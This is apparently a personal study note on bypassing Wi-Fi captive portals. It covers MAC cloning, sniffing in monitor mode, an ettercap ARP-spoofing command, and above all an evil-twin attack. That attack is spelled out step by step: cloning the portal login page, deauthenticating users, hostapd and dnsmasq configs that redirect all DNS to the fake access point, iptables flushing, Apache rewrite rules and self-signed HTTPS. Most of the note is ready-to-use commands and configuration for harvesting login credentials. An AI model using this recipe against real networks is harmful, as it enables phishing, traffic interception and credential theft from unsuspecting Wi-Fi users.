captive portals make users connect to wifi using a web interface

## Ways of bypassing captive portals
- change mac address to that of a connected client
- sniff logins in monitor mode
- connect and sniff logins after running an arp spoofing attack
- create a fake AP, ask users to login

## Sniffing credentials in monitor mode
Used if there is no encryption
can use airodump-ng to sniff and save then use wireshark to read it

## Sniffing credentials by Arp Spoofing
By running arp spoofing attack,
- the client will lose their connection and will be asked to login again.
- Data sent to/from the access point will be directed to you

`ettercap -Tq -M arp:remote -i <interface-name> ///`

## Using Social Engineering via Evil Twin attack
- clone the login page
- create a fake AP with the same/similar name
- Deauth users to use the fake network withe cloned page
- sniff the login info

### Cloning the login page
- Save the website
- move it to /var/www/html/
- rename downloaded html to index.html
- starting your webserver with `service apache2 start`
- localhost should show the login page ie 127.0.0.1

> [!NOTE] Issues when cloning the webpages
> Fix relative links in the webpages
> wrap your input tags with a form tag that has a post method
> also watch your button behaviour
### Creating Fake AP
The main components of a wifi network are:
- a router broadcasting signal => hostapd
- a DHCP server to give IPs to clients => dnsmasq
- A DNS serer to handle DNS requests =>dnsmasq

Disable network manager
`service network-manager stop`
Flush your IP tables(optional)
`echo 1 > /proc/sys/net/ipv4/ip_forward`
`iptables --flush`
`iptables --table nat --flush`
`iptables --delete-chain`
`iptables --table nat --delete-chain`
`iptables -P FORWARD ACCEPT`

Dnsmasq config
```
#set wifi interface
interface=<interface-name>

#set ip range for clients
dhcp-range=10.0.0.10,10.0.0.100,8h

#set gateway ip address
dhcp-option=3,10.0.0.1

#set dns server address
dhcp-option=6,10.0.0.1

#redirect all requests to 10.0.0.1
address=/#/10.0.0.1
```

Hostpad Config
```
#set wifi interface
interface=<interface-name>

#Set network name
#make the name same or similar to real AP
ssid=<wifi-name>

#set channel
channel=1

#set driver
driver=<wifi-driver>

```

setting up dnsmasq
`dnsmasq -C /path/to/dnsmasq/config/file`

setting hostapd to initize the access point
`hostapd /path/to/hostapd/file -B`

setting wifi's ip address and netmask address
`ifconfig <interface-name> 10.0.0.1 netmask 255.255.255.0`

modify apache config for dns redirecting to fake login page
path to config file=> /etc/apache2/sites-enabled/000-default.conf
```
<Directory "/var/www/html">
	RewriteEngine On
	RewriteBase /
	RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
	RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
	
	RewriteCond %{REQUEST_FILENAME} !-f
	RewriteCond %{REQUEST_FILENAME} !-d
	RewriteRule ^(.*)$ / [L,QSA]
</Directory>
```

generate ssl certificate
`openssl req -new -x509 -days 365 -out /path/to/save/cert -keyout /path/to/save/cert/key`
cert extension => .pem
cert key extension => .key
You will be require to make a passkey for the cert

enabling https on apache
`a2enmod ssl

Edit apache config
```
<VirtualHost *:443>
	SSlEngine On
	SSLCertificateFile /path/to/cert/file
	SSLCertificateKeyFile /path/to/cert/key
</VirtualHost>
```

Modify apache ports file
path => /etc/apache2/ports.conf
```
Listen 443
```

start the webserver
`service apache2 start`


> [!NOTE] Note
> Always restart apache after every modification
> `service apache restart`
